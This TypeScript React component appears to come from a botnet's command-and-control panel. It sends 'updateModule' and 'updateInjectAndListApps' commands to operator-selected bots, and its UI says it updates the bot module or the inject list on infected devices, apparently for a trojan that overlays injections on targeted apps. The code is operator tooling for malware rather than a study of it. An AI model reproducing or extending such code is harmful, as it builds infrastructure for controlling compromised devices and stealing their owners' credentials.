import { useContext } from 'react';
import { Button, notification } from "antd"
import { BotContext } from '../providers';
import { setCommand } from '../services';
import { ServerResponseType } from '../../../common/DataType';

export default () => {
  const { state, setState } = useContext(BotContext)

  const updateModule = () => {

    if (state.selectedBots.length == 0) {
      notification['error']({
        message: 'ERROR',
        description: 'Please select the bot.'
      })

      return
    }

    setCommand(state.selectedBots, '{"name":"updateModule"}').then((res: ServerResponseType) => {
      notification['info']({
        message: res.type.toUpperCase(),
        description: res.message
      })
    })
  }

  const updateAppList = () => {


    if (state.selectedBots.length == 0) {
      notification['error']({
        message: 'ERROR',
        description: 'Please select the bot.'
      })

      return
    }

    setCommand(state.selectedBots, '{"name":"updateInjectAndListApps"}').then((res: ServerResponseType) => {
      notification['info']({
        message: res.type.toUpperCase(),
        description: res.message
      })
    })
  }

  return (
    <div className="pb-6">
      <h2 className="text-xl">Update Module or app list</h2>
      <p className="text-stone-500">You can update bot module, or inject list on selected bots</p>
      <Button ghost type="primary" className="float-left" onClick={updateAppList}>Update App Lists</Button>
      <Button ghost type="primary" className="float-right" onClick={updateModule}>Update module</Button>
    </div>
  )
}